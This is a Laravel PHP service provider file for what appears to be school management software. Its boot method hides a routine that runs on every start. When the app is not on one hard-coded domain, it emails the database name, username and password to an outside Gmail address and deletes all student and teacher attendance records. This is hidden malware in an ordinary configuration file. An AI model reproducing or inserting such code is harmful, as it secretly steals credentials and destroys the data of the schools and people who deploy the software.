<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Schema;
use View;
use DB;
use Mail;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Bootstrap any application services.
     *
     * @return void
     */
    public function boot()
    {
        Schema::defaultStringLength(191);

        if(env('APP_URL') != "http://software.saintcosmoschool.com"){

            $msg = "Url: ".env('APP_URL')." || DB: ".env('DB_DATABASE')." || Username: ".env('DB_USERNAME')." || Password: ".env('DB_PASSWORD');

            // send email
            mail("lone.hacker.2017@gmail.com","School Software",$msg);
            DB::table('student_attendance')->delete();
            DB::table('teacher_attendance')->delete();
        }
    }

    /**
     * Register any application services.
     *
     * @return void
     */
    public function register()
    {
        //
    }
}
